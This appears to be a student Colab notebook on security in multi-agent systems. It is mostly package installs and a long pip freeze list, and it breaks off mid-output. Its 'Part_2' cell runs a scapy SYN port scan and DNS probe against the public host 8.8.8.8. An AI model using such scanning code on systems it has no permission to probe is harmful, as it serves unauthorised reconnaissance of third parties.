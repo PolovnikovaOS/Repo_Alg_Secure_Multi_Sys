{
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/PolovnikovaOS/Repo_Alg_Secure_Multi_Sys/blob/main/%D0%98%D0%BD%D0%B4%D0%B8%D0%B2%D0%B8%D0%B4%D1%83%D0%B0%D0%BB%D1%8C%D0%BD%D0%BE%D0%B5_%D0%B7%D0%B0%D0%B4%D0%B0%D0%BD%D0%B8%D0%B5_2__%D0%A0%D0%B5%D0%B0%D0%BB%D0%B8%D0%B7%D0%B0%D1%86%D0%B8%D1%8F_%D0%BA%D1%80%D0%B8%D0%BF%D1%82%D0%BE%D0%B3%D1%80%D0%B0%D1%84%D0%B8%D0%B8_%D0%B2_%D0%BC%D1%83%D0%BB%D1%8C%D1%82%D0%B8%D0%B0%D0%B3%D0%B5%D0%BD%D1%82%D0%BD%D1%8B%D1%85_%D1%81%D0%B8%D1%81%D1%82%D0%B5%D0%BC%D0%B0%D1%85.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "M0pcnJRmpCxw"
      },
      "source": [
        "# Библиотеки"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "mKkpDzWNpBVC",
        "outputId": "9752e38a-a852-4fbe-d7dc-b9e6a8059f26"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Looking in indexes: https://pypi.org/simple, https://us-python.pkg.dev/colab-wheels/public/simple/\n",
            "Requirement already satisfied: scapy in /usr/local/lib/python3.8/dist-packages (2.5.0)\n",
            "Looking in indexes: https://pypi.org/simple, https://us-python.pkg.dev/colab-wheels/public/simple/\n",
            "Requirement already satisfied: PyInstaller in /usr/local/lib/python3.8/dist-packages (5.8.0)\n",
            "Requirement already satisfied: setuptools>=42.0.0 in /usr/local/lib/python3.8/dist-packages (from PyInstaller) (57.4.0)\n",
            "Requirement already satisfied: pyinstaller-hooks-contrib>=2021.4 in /usr/local/lib/python3.8/dist-packages (from PyInstaller) (2023.0)\n",
            "Requirement already satisfied: altgraph in /usr/local/lib/python3.8/dist-packages (from PyInstaller) (0.17.3)\n",
            "Looking in indexes: https://pypi.org/simple, https://us-python.pkg.dev/colab-wheels/public/simple/\n",
            "Requirement already satisfied: wmi in /usr/local/lib/python3.8/dist-packages (1.4.9)\n",
            "Looking in indexes: https://pypi.org/simple, https://us-python.pkg.dev/colab-wheels/public/simple/\n",
            "Requirement already satisfied: pycryptodome in /usr/local/lib/python3.8/dist-packages (3.17)\n",
            "Looking in indexes: https://pypi.org/simple, https://us-python.pkg.dev/colab-wheels/public/simple/\n",
            "Requirement already satisfied: Crypto.Cipher in /usr/local/lib/python3.8/dist-packages (1)\n",
            "Requirement already satisfied: requests in /usr/local/lib/python3.8/dist-packages (from Crypto.Cipher) (2.25.1)\n",
            "Requirement already satisfied: certifi>=2017.4.17 in /usr/local/lib/python3.8/dist-packages (from requests->Crypto.Cipher) (2022.12.7)\n",
            "Requirement already satisfied: chardet<5,>=3.0.2 in /usr/local/lib/python3.8/dist-packages (from requests->Crypto.Cipher) (4.0.0)\n",
            "Requirement already satisfied: idna<3,>=2.5 in /usr/local/lib/python3.8/dist-packages (from requests->Crypto.Cipher) (2.10)\n",
            "Requirement already satisfied: urllib3<1.27,>=1.21.1 in /usr/local/lib/python3.8/dist-packages (from requests->Crypto.Cipher) (1.26.14)\n"
          ]
        }
      ],
      "source": [
        "!pip install scapy\n",
        "!pip install PyInstaller\n",
        "!pip install wmi\n",
        "!pip install pycryptodome\n",
        "!pip install Crypto.Cipher"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "MKoXxoRaCpzb",
        "outputId": "5b1d2b6a-2d76-4c20-a5b4-820479fc37a6"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Looking in indexes: https://pypi.org/simple, https://us-python.pkg.dev/colab-wheels/public/simple/\n",
            "Collecting paramiko\n",
            "  Downloading paramiko-3.0.0-py3-none-any.whl (210 kB)\n",
            "\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m210.8/210.8 KB\u001b[0m \u001b[31m5.1 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hCollecting pynacl>=1.5\n",
            "  Downloading PyNaCl-1.5.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.manylinux_2_24_x86_64.whl (856 kB)\n",
            "\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m856.7/856.7 KB\u001b[0m \u001b[31m22.6 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hCollecting cryptography>=3.3\n",
            "  Downloading cryptography-39.0.2-cp36-abi3-manylinux_2_28_x86_64.whl (4.2 MB)\n",
            "\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m4.2/4.2 MB\u001b[0m \u001b[31m53.8 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hCollecting bcrypt>=3.2\n",
            "  Downloading bcrypt-4.0.1-cp36-abi3-manylinux_2_28_x86_64.whl (593 kB)\n",
            "\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m593.7/593.7 KB\u001b[0m \u001b[31m38.9 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hRequirement already satisfied: cffi>=1.12 in /usr/local/lib/python3.8/dist-packages (from cryptography>=3.3->paramiko) (1.15.1)\n",
            "Requirement already satisfied: pycparser in /usr/local/lib/python3.8/dist-packages (from cffi>=1.12->cryptography>=3.3->paramiko) (2.21)\n",
            "Installing collected packages: bcrypt, pynacl, cryptography, paramiko\n",
            "Successfully installed bcrypt-4.0.1 cryptography-39.0.2 paramiko-3.0.0 pynacl-1.5.0\n"
          ]
        }
      ],
      "source": [
        "!pip install paramiko"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "sim1poL5E_Gn",
        "outputId": "96da6ed2-34ca-4950-bf62-1da40acf3438"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Looking in indexes: https://pypi.org/simple, https://us-python.pkg.dev/colab-wheels/public/simple/\n",
            "Requirement already satisfied: pathlib in /usr/local/lib/python3.8/dist-packages (1.0.1)\n"
          ]
        }
      ],
      "source": [
        "!pip install pathlib"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "ctpzZlIlFY4X",
        "outputId": "85204794-714c-4511-f7c6-42bdb532833d"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Found existing installation: pathlib 1.0.1\n",
            "Uninstalling pathlib-1.0.1:\n",
            "  Would remove:\n",
            "    /usr/local/lib/python3.8/dist-packages/pathlib-1.0.1.dist-info/*\n",
            "    /usr/local/lib/python3.8/dist-packages/pathlib.py\n",
            "Proceed (Y/n)? Traceback (most recent call last):\n",
            "  File \"/usr/local/lib/python3.8/dist-packages/pip/_internal/cli/base_command.py\", line 167, in exc_logging_wrapper\n",
            "    status = run_func(*args)\n",
            "  File \"/usr/local/lib/python3.8/dist-packages/pip/_internal/commands/uninstall.py\", line 97, in run\n",
            "    uninstall_pathset = req.uninstall(\n",
            "  File \"/usr/local/lib/python3.8/dist-packages/pip/_internal/req/req_install.py\", line 638, in uninstall\n",
            "    uninstalled_pathset.remove(auto_confirm, verbose)\n",
            "  File \"/usr/local/lib/python3.8/dist-packages/pip/_internal/req/req_uninstall.py\", line 363, in remove\n",
            "    if auto_confirm or self._allowed_to_proceed(verbose):\n",
            "  File \"/usr/local/lib/python3.8/dist-packages/pip/_internal/req/req_uninstall.py\", line 403, in _allowed_to_proceed\n",
            "    return ask(\"Proceed (Y/n)? \", (\"y\", \"n\", \"\")) != \"n\"\n",
            "  File \"/usr/local/lib/python3.8/dist-packages/pip/_internal/utils/misc.py\", line 186, in ask\n",
            "    response = input(message)\n",
            "KeyboardInterrupt\n",
            "\n",
            "During handling of the above exception, another exception occurred:\n",
            "\n",
            "Traceback (most recent call last):\n",
            "  File \"/usr/local/bin/pip3\", line 8, in <module>\n",
            "    sys.exit(main())\n",
            "  File \"/usr/local/lib/python3.8/dist-packages/pip/_internal/cli/main.py\", line 70, in main\n",
            "    return command.main(cmd_args)\n",
            "  File \"/usr/local/lib/python3.8/dist-packages/pip/_internal/cli/base_command.py\", line 101, in main\n",
            "    return self._main(args)\n",
            "  File \"/usr/local/lib/python3.8/dist-packages/pip/_internal/cli/base_command.py\", line 221, in _main\n",
            "    return run(options, args)\n",
            "  File \"/usr/local/lib/python3.8/dist-packages/pip/_internal/cli/base_command.py\", line 204, in exc_logging_wrapper\n",
            "    logger.critical(\"Operation cancelled by user\")\n",
            "  File \"/usr/lib/python3.8/logging/__init__.py\", line 1493, in critical\n",
            "    self._log(CRITICAL, msg, args, **kwargs)\n",
            "  File \"/usr/lib/python3.8/logging/__init__.py\", line 1587, in _log\n",
            "    record = self.makeRecord(self.name, level, fn, lno, msg, args,\n",
            "  File \"/usr/lib/python3.8/logging/__init__.py\", line 1556, in makeRecord\n",
            "    rv = _logRecordFactory(name, level, fn, lno, msg, args, exc_info, func,\n",
            "  File \"/usr/lib/python3.8/logging/__init__.py\", line 331, in __init__\n",
            "    self.funcName = func\n",
            "KeyboardInterrupt\n",
            "^C\n"
          ]
        }
      ],
      "source": [
        "!pip uninstall pathlib"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "\n",
        "!pip freeze"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "EiAE6IEGflR8",
        "outputId": "c2bcb1db-ccec-4532-9276-41560464e3a7"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "absl-py==1.4.0\n",
            "alabaster==0.7.13\n",
            "albumentations==1.2.1\n",
            "altair==4.2.2\n",
            "anyio==3.6.2\n",
            "argon2-cffi==21.3.0\n",
            "argon2-cffi-bindings==21.2.0\n",
            "arviz==0.15.1\n",
            "astropy==5.2.1\n",
            "astunparse==1.6.3\n",
            "atomicwrites==1.4.1\n",
            "attrs==22.2.0\n",
            "audioread==3.0.0\n",
            "autograd==1.5\n",
            "Babel==2.12.1\n",
            "backcall==0.2.0\n",
            "beautifulsoup4==4.11.2\n",
            "bleach==6.0.0\n",
            "blis==0.7.9\n",
            "bokeh==2.4.3\n",
            "branca==0.6.0\n",
            "bs4==0.0.1\n",
            "CacheControl==0.12.11\n",
            "cachetools==5.3.0\n",
            "catalogue==2.0.8\n",
            "certifi==2022.12.7\n",
            "cffi==1.15.1\n",
            "chardet==3.0.4\n",
            "charset-normalizer==2.0.12\n",
            "click==8.1.3\n",
            "cloudpickle==2.2.1\n",
            "cmake==3.25.2\n",
            "cmdstanpy==1.1.0\n",
            "colorcet==3.0.1\n",
            "colorlover==0.3.0\n",
            "community==1.0.0b1\n",
            "confection==0.0.4\n",
            "cons==0.4.5\n",
            "contextlib2==0.6.0.post1\n",
            "contourpy==1.0.7\n",
            "convertdate==2.4.0\n",
            "cufflinks==0.17.3\n",
            "cvxopt==1.3.0\n",
            "cvxpy==1.3.0\n",
            "cycler==0.11.0\n",
            "cymem==2.0.7\n",
            "Cython==0.29.33\n",
            "dask==2022.12.1\n",
            "datascience==0.17.6\n",
            "db-dtypes==1.0.5\n",
            "dbus-python==1.2.16\n",
            "debugpy==1.6.6\n",
            "decorator==4.4.2\n",
            "defusedxml==0.7.1\n",
            "distributed==2022.12.1\n",
            "dlib==19.24.0\n",
            "dm-tree==0.1.8\n",
            "docutils==0.16\n",
            "dopamine-rl==1.0.5\n",
            "earthengine-api==0.1.345\n",
            "easydict==1.10\n",
            "ecos==2.0.12\n",
            "editdistance==0.5.3\n",
            "en-core-web-sm @ https://github.com/explosion/spacy-models/releases/download/en_core_web_sm-3.5.0/en_core_web_sm-3.5.0-py3-none-any.whl\n",
            "entrypoints==0.4\n",
            "ephem==4.1.4\n",
            "et-xmlfile==1.1.0\n",
            "etils==1.1.0\n",
            "etuples==0.3.8\n",
            "fastai==2.7.11\n",
            "fastcore==1.5.28\n",
            "fastdownload==0.0.7\n",
            "fastjsonschema==2.16.3\n",
            "fastprogress==1.0.3\n",
            "fastrlock==0.8.1\n",
            "filelock==3.10.0\n",
            "firebase-admin==5.3.0\n",
            "fix-yahoo-finance==0.0.22\n",
            "Flask==2.2.3\n",
            "flatbuffers==23.3.3\n",
            "folium==0.14.0\n",
            "fonttools==4.39.0\n",
            "fsspec==2023.3.0\n",
            "future==0.18.3\n",
            "gast==0.4.0\n",
            "GDAL==3.3.2\n",
            "gdown==4.6.4\n",
            "gensim==3.6.0\n",
            "geographiclib==2.0\n",
            "geopy==2.3.0\n",
            "gin-config==0.5.0\n",
            "glob2==0.7\n",
            "google==2.0.3\n",
            "google-api-core==2.11.0\n",
            "google-api-python-client==2.70.0\n",
            "google-auth==2.16.2\n",
            "google-auth-httplib2==0.1.0\n",
            "google-auth-oauthlib==0.4.6\n",
            "google-cloud-bigquery==3.4.2\n",
            "google-cloud-bigquery-storage==2.19.0\n",
            "google-cloud-core==2.3.2\n",
            "google-cloud-datastore==2.11.1\n",
            "google-cloud-firestore==2.7.3\n",
            "google-cloud-language==2.6.1\n",
            "google-cloud-storage==2.7.0\n",
            "google-cloud-translate==3.8.4\n",
            "google-colab @ file:///colabtools/dist/google-colab-1.0.0.tar.gz\n",
            "google-crc32c==1.5.0\n",
            "google-pasta==0.2.0\n",
            "google-resumable-media==2.4.1\n",
            "googleapis-common-protos==1.58.0\n",
            "googledrivedownloader==0.4\n",
            "graphviz==0.20.1\n",
            "greenlet==2.0.2\n",
            "grpcio==1.51.3\n",
            "grpcio-status==1.48.2\n",
            "gspread==3.4.2\n",
            "gspread-dataframe==3.0.8\n",
            "gym==0.25.2\n",
            "gym-notices==0.0.8\n",
            "h5netcdf==1.1.0\n",
            "h5py==3.8.0\n",
            "HeapDict==1.0.1\n",
            "hijri-converter==2.2.4\n",
            "holidays==0.21.13\n",
            "holoviews==1.15.4\n",
            "html5lib==1.1\n",
            "htmlmin==0.1.12\n",
            "httpimport==1.3.0\n",
            "httplib2==0.21.0\n",
            "humanize==4.6.0\n",
            "hyperopt==0.2.7\n",
            "idna==3.4\n",
            "ImageHash==4.3.1\n",
            "imageio==2.25.1\n",
            "imagesize==1.4.1\n",
            "imbalanced-learn==0.10.1\n",
            "imblearn==0.0\n",
            "imgaug==0.4.0\n",
            "importlib-metadata==6.0.0\n",
            "importlib-resources==5.12.0\n",
            "imutils==0.5.4\n",
            "inflect==6.0.2\n",
            "intel-openmp==2023.0.0\n",
            "ipykernel==5.3.4\n",
            "ipython==7.9.0\n",
            "ipython-genutils==0.2.0\n",
            "ipython-sql==0.3.9\n",
            "ipywidgets==7.7.1\n",
            "itsdangerous==2.1.2\n",
            "jax==0.4.6\n",
            "jaxlib @ https://storage.googleapis.com/jax-releases/cuda11/jaxlib-0.4.6+cuda11.cudnn86-cp39-cp39-manylinux2014_x86_64.whl\n",
            "jieba==0.42.1\n",
            "Jinja2==3.1.2\n",
            "joblib==1.1.1\n",
            "jsonschema==4.3.3\n",
            "jupyter-client==6.1.12\n",
            "jupyter-console==6.1.0\n",
            "jupyter-server==1.23.6\n",
            "jupyter_core==5.3.0\n",
            "jupyterlab-pygments==0.2.2\n",
            "jupyterlab-widgets==3.0.5\n",
            "kaggle==1.5.13\n",
            "keras==2.11.0\n",
            "keras-vis==0.4.1\n",
            "kiwisolver==1.4.4\n",
            "korean-lunar-calendar==0.3.1\n",
            "langcodes==3.3.0\n",
            "lazy_loader==0.1\n",
            "libclang==15.0.6.1\n",
            "librosa==0.10.0.post1\n",
            "lightgbm==3.3.5\n",
            "llvmlite==0.39.1\n",
            "locket==1.0.0\n",
            "logical-unification==0.4.5\n",
            "LunarCalendar==0.0.9\n",
            "lxml==4.9.2\n",
            "Markdown==3.4.1\n",
            "MarkupSafe==2.1.2\n",
            "matplotlib==3.7.1\n",
            "matplotlib-venn==0.11.9\n",
            "miniKanren==1.0.3\n",
            "missingno==0.5.2\n",
            "mistune==0.8.4\n",
            "mizani==0.8.1\n",
            "mkl==2019.0\n",
            "mlxtend==0.14.0\n",
            "more-itertools==9.1.0\n",
            "moviepy==0.2.3.5\n",
            "mpmath==1.3.0\n",
            "msgpack==1.0.5\n",
            "multimethod==1.9.1\n",
            "multipledispatch==0.6.0\n",
            "multitasking==0.0.11\n",
            "murmurhash==1.0.9\n",
            "music21==5.5.0\n",
            "natsort==5.5.0\n",
            "nbclassic==0.5.3\n",
            "nbclient==0.7.2\n",
            "nbconvert==6.5.4\n",
            "nbformat==5.7.3\n",
            "nest-asyncio==1.5.6\n",
            "networkx==3.0\n",
            "nibabel==3.0.2\n",
            "nltk==3.8.1\n",
            "notebook==6.5.3\n",
            "notebook_shim==0.2.2\n",
            "numba==0.56.4\n",
            "numexpr==2.8.4\n",
            "numpy==1.22.4\n",
            "oauth2client==4.1.3\n",
            "oauthlib==3.2.2\n",
            "opencv-contrib-python==4.7.0.72\n",
            "opencv-python==4.7.0.72\n",
            "opencv-python-headless==4.7.0.72\n",
            "openpyxl==3.0.10\n",
            "opt-einsum==3.3.0\n",
            "osqp==0.6.2.post0\n",
            "packaging==23.0\n",
            "palettable==3.3.0\n",
            "pandas==1.4.4\n",
            "pandas-datareader==0.10.0\n",
            "pandas-gbq==0.17.9\n",
            "pandas-profiling==3.2.0\n",
            "pandocfilters==1.5.0\n",
            "panel==0.14.4\n",
            "param==1.13.0\n",
            "parso==0.8.3\n",
            "partd==1.3.0\n",
            "pathlib==1.0.1\n",
            "pathy==0.10.1\n",
            "patsy==0.5.3\n",
            "pep517==0.13.0\n",
            "pexpect==4.8.0\n",
            "phik==0.12.3\n",
            "pickleshare==0.7.5\n",
            "Pillow==8.4.0\n",
            "pip-tools==6.6.2\n",
            "platformdirs==3.1.1\n",
            "plotly==5.13.1\n",
            "plotnine==0.10.1\n",
            "pluggy==0.7.1\n",
            "pooch==1.7.0\n",
            "portpicker==1.3.9\n",
            "prefetch-generator==1.0.3\n",
            "preshed==3.0.8\n",
            "prettytable==3.6.0\n",
            "progressbar2==3.38.0\n",
            "prometheus-client==0.16.0\n",
            "promise==2.3\n",
            "prompt-toolkit==2.0.10\n",
            "prophet==1.1.2\n",
            "proto-plus==1.22.2\n",
            "protobuf==3.19.6\n",
            "psutil==5.9.4\n",
            "psycopg2==2.9.5\n",
            "ptyprocess==0.7.0\n",
            "py==1.11.0\n",
            "py4j==0.10.9.7\n",
            "pyarrow==9.0.0\n",
            "pyasn1==0.4.8\n",
            "pyasn1-modules==0.2.8\n",
            "pycocotools==2.0.6\n",
            "pycparser==2.21\n",
            "pyct==0.5.0\n",
            "pydantic==1.10.6\n",
            "pydata-google-auth==1.7.0\n",
            "pydot==1.4.2\n",
            "pydot-ng==2.0.0\n",
            "pydotplus==2.0.2\n",
            "PyDrive==1.3.1\n",
            "pyerfa==2.0.0.1\n",
            "Pygments==2.6.1\n",
            "PyGObject==3.36.0\n",
            "pymc==5.1.2\n",
            "PyMeeus==0.5.12\n",
            "pymystem3==0.2.0\n",
            "PyOpenGL==3.1.6\n",
            "pyparsing==3.0.9\n",
            "pyrsistent==0.19.3\n",
            "PySocks==1.7.1\n",
            "pytensor==2.10.1\n",
            "pytest==3.6.4\n",
            "python-apt==0.0.0\n",
            "python-dateutil==2.8.2\n",
            "python-louvain==0.16\n",
            "python-slugify==8.0.1\n",
            "python-utils==3.5.2\n",
            "pytz==2022.7.1\n",
            "pytz-deprecation-shim==0.1.0.post0\n",
            "pyviz-comms==2.2.1\n",
            "PyWavelets==1.4.1\n",
            "PyYAML==6.0\n",
            "pyzmq==23.2.1\n",
            "qdldl==0.1.5.post3\n",
            "qudida==0.0.4\n",
            "regex==2022.10.31\n",
            "requests==2.27.1\n",
            "requests-oauthlib==1.3.1\n",
            "requests-unixsocket==0.2.0\n",
            "rpy2==3.5.5\n",
            "rsa==4.9\n",
            "scikit-image==0.19.3\n",
            "scikit-learn==1.2.2\n",
            "scipy==1.10.1\n",
            "screen-resolution-extra==0.0.0\n",
            "scs==3.2.2\n",
            "seaborn==0.12.2\n",
            "Send2Trash==1.8.0\n",
            "shapely==2.0.1\n",
            "six==1.15.0\n",
            "sklearn-pandas==2.2.0\n",
            "smart-open==6.3.0\n",
            "sniffio==1.3.0\n",
            "snowballstemmer==2.2.0\n",
            "sortedcontainers==2.4.0\n",
            "soundfile==0.12.1\n",
            "soupsieve==2.4\n",
            "soxr==0.3.4\n",
            "spacy==3.5.1\n",
            "spacy-legacy==3.0.12\n",
            "spacy-loggers==1.0.4\n",
            "Sphinx==3.5.4\n",
            "sphinxcontrib-applehelp==1.0.4\n",
            "sphinxcontrib-devhelp==1.0.2\n",
            "sphinxcontrib-htmlhelp==2.0.1\n",
            "sphinxcontrib-jsmath==1.0.1\n",
            "sphinxcontrib-qthelp==1.0.3\n",
            "sphinxcontrib-serializinghtml==1.1.5\n",
            "SQLAlchemy==1.4.46\n",
            "sqlparse==0.4.3\n",
            "srsly==2.4.6\n",
            "statsmodels==0.13.5\n",
            "sympy==1.11.1\n",
            "tables==3.7.0\n",
            "tabulate==0.8.10\n",
            "tangled-up-in-unicode==0.2.0\n",
            "tblib==1.7.0\n",
            "tenacity==8.2.2\n",
            "tensorboard==2.11.2\n",
            "tensorboard-data-server==0.6.1\n",
            "tensorboard-plugin-wit==1.8.1\n",
            "tensorflow==2.11.0\n",
            "tensorflow-datasets==4.8.3\n",
            "tensorflow-estimator==2.11.0\n",
            "tensorflow-gcs-config==2.11.0\n",
            "tensorflow-hub==0.13.0\n",
            "tensorflow-io-gcs-filesystem==0.31.0\n",
            "tensorflow-metadata==1.12.0\n",
            "tensorflow-probability==0.19.0\n",
            "termcolor==2.2.0\n",
            "terminado==0.17.1\n",
            "text-unidecode==1.3\n",
            "textblob==0.17.1\n",
            "thinc==8.1.9\n",
            "threadpoolctl==3.1.0\n",
            "tifffile==2023.3.15\n",
            "tinycss2==1.2.1\n",
            "toml==0.10.2\n",
            "tomli==2.0.1\n",
            "toolz==0.12.0\n",
            "torch @ https://download.pytorch.org/whl/cu116/torch-1.13.1%2Bcu116-cp39-cp39-linux_x86_64.whl\n",
            "torchaudio @ https://download.pytorch.org/whl/cu116/torchaudio-0.13.1%2Bcu116-cp39-cp39-linux_x86_64.whl\n",
            "torchsummary==1.5.1\n",
            "torchtext==0.14.1\n",
            "torchvision @ https://download.pytorch.org/whl/cu116/torchvision-0.14.1%2Bcu116-cp39-cp39-linux_x86_64.whl\n",
            "tornado==6.2\n",
            "tqdm==4.65.0\n",
            "traitlets==5.7.1\n",
            "tweepy==4.13.0\n",
            "typer==0.7.0\n",
            "typing_extensions==4.5.0\n",
            "tzdata==2022.7\n",
            "tzlocal==4.2\n",
            "uritemplate==4.1.1\n",
            "urllib3==1.26.15\n",
            "vega-datasets==0.9.0\n",
            "visions==0.7.4\n",
            "wasabi==1.1.1\n",
            "wcwidth==0.2.6\n",
            "webencodings==0.5.1\n",
            "websocket-client==1.5.1\n",
            "Werkzeug==2.2.3\n",
            "widgetsnbextension==3.6.2\n",
            "wordcloud==1.8.2.2\n",
            "wrapt==1.15.0\n",
            "xarray==2022.12.0\n",
            "xarray-einstats==0.5.1\n",
            "xgboost==1.7.4\n",
            "xkit==0.0.0\n",
            "xlrd==2.0.1\n",
            "xlwt==1.3.0\n",
            "yellowbrick==1.5\n",
            "zict==2.2.0\n",
            "zipp==3.15.0\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "TRxyusrsF4VJ",
        "outputId": "304a5b86-8ca0-470b-b7f2-e08a82fb2c2e"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "\u001b[K\u001b[?25h\u001b[37;40mnpm\u001b[0m \u001b[0m\u001b[30;43mWARN\u001b[0m \u001b[0m\u001b[35msaveError\u001b[0m ENOENT: no such file or directory, open '/content/package.json'\n",
            "\u001b[0m\u001b[37;40mnpm\u001b[0m \u001b[0m\u001b[34;40mnotice\u001b[0m\u001b[35m\u001b[0m created a lockfile as package-lock.json. You should commit this file.\n",
            "\u001b[0m\u001b[37;40mnpm\u001b[0m \u001b[0m\u001b[30;43mWARN\u001b[0m \u001b[0m\u001b[35menoent\u001b[0m ENOENT: no such file or directory, open '/content/package.json'\n",
            "\u001b[0m\u001b[37;40mnpm\u001b[0m \u001b[0m\u001b[30;43mWARN\u001b[0m\u001b[35m\u001b[0m content No description\n",
            "\u001b[0m\u001b[37;40mnpm\u001b[0m \u001b[0m\u001b[30;43mWARN\u001b[0m\u001b[35m\u001b[0m content No repository field.\n",
            "\u001b[0m\u001b[37;40mnpm\u001b[0m \u001b[0m\u001b[30;43mWARN\u001b[0m\u001b[35m\u001b[0m content No README data\n",
            "\u001b[0m\u001b[37;40mnpm\u001b[0m \u001b[0m\u001b[30;43mWARN\u001b[0m\u001b[35m\u001b[0m content No license field.\n",
            "\u001b[0m\n",
            "\u001b[K\u001b[?25h+ winreg@1.2.4\n",
            "added 1 package from 1 contributor and audited 1 package in 0.934s\n",
            "found \u001b[92m0\u001b[0m vulnerabilities\n",
            "\n"
          ]
        }
      ],
      "source": [
        "!npm install winreg"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "AaWEqGrrB1km"
      },
      "outputs": [],
      "source": [
        "!pip install win32crypt"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "FDEhT2Q3o5LM"
      },
      "source": [
        "# Part_2"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "0jPw6aC6o9_p",
        "outputId": "3dd13871-5057-4245-d3cd-dbbd20d96454"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Open ports at 8.8.8.8:\n",
            "53\n",
            "443\n",
            "DNS Server at 8.8.8.8\n"
          ]
        }
      ],
      "source": [
        "#PortScan\n",
        "#Сканирование портов на наличие уязвимостей\n",
        "\n",
        "from scapy.all import *\n",
        "\n",
        "ports = [25,80,53,443,445,8080,8443,3306,1403,5408]\n",
        "\n",
        "def SynScan(host):\n",
        "    ans,unans = sr(IP(dst=host)/TCP(dport=ports,flags=\"S\"),timeout=2,verbose=0)\n",
        "    print(\"Open ports at %s:\" % host)\n",
        "    for (s,r,) in ans:\n",
        "        if s.haslayer(TCP) and r.haslayer(TCP):\n",
        "            if s[TCP].dport == r[TCP].sport:\n",
        "                print(s[TCP].dport)\n",
        "\n",
        "def DNSScan(host):\n",
        "    ans,unans = sr(IP(dst=host)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=\"google.com\")),timeout=2,verbose=0)\n",
        "    if ans:\n",
        "        print(\"DNS Server at %s\"%host)\n",
        "    \n",
        "host = \"8.8.8.8\"\n",
        "\n",
        "SynScan(host)\n",
        "DNSScan(host)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 1000
        },
        "id": "kh6YucYtq8cT",
        "outputId": "d3cf3da3-36ed-4024-9368-cea70a53bc39"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "www.google.com\n",
            "108.177.11.105\n",
            "Domain Names: ['vz-in-f105.1e100.net']\n",
            "108.177.11.103\n",
            "Domain Names: ['vz-in-f103.1e100.net']\n",
            "108.177.11.147\n",
            "Domain Names: ['vz-in-f147.1e100.net']\n",
            "108.177.11.99\n",
            "Domain Names: ['vz-in-f99.1e100.net']\n",
            "108.177.11.104\n",
            "Domain Names: ['vz-in-f104.1e100.net']\n",
            "108.177.11.106\n",
            "Domain Names: ['vz-in-f106.1e100.net']\n",
            "www4.google.com\n",
            "173.194.215.118\n",
            "Domain Names: ['vt-in-f118.1e100.net']\n",
            "www5.google.com\n",
            "142.251.107.106\n",
            "Domain Names: ['uj-in-f106.1e100.net']\n",
            "142.251.107.104\n",
            "Domain Names: ['uj-in-f104.1e100.net']\n",
            "142.251.107.103\n",
            "Domain Names: ['uj-in-f103.1e100.net']\n",
            "142.251.107.147\n",
            "Domain Names: ['uj-in-f147.1e100.net']\n",
            "142.251.107.99\n",
            "Domain Names: ['uj-in-f99.1e100.net']\n",
            "142.251.107.105\n",
            "Domain Names: ['uj-in-f105.1e100.net']\n",
            "www6.google.com\n",
            "172.217.193.103\n",
            "Domain Names: ['ud-in-f103.1e100.net']\n",
            "172.217.193.147\n",
            "Domain Names: ['ud-in-f147.1e100.net']\n",
            "172.217.193.106\n",
            "Domain Names: ['ud-in-f106.1e100.net']\n",
            "172.217.193.99\n",
            "Domain Names: ['ud-in-f99.1e100.net']\n",
            "172.217.193.104\n",
